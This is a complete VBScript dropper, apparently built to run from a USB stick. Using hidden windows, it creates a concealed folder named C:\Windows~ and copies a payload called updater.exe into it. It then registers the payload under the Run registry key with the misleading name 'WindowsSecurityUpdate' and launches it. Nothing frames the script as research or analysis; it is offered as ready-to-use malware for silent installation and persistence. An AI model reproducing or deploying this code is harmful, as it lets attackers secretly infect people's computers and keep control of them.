
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get USB drive path
usbPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Create hidden folder
objShell.Run "cmd /c mkdir C:\Windows~ & attrib +h C:\Windows~", 0, True

' Copy payload
objShell.Run "cmd /c copy """ & usbPath & "\updater.exe"" ""C:\Windows~\updater.exe""", 0, True

' Add to registry
objShell.Run "reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""WindowsSecurityUpdate"" /t REG_SZ /d ""C:\Windows~\updater.exe"" /f", 0, True

' Run payload
objShell.Run "C:\Windows~\updater.exe", 0, False

EOF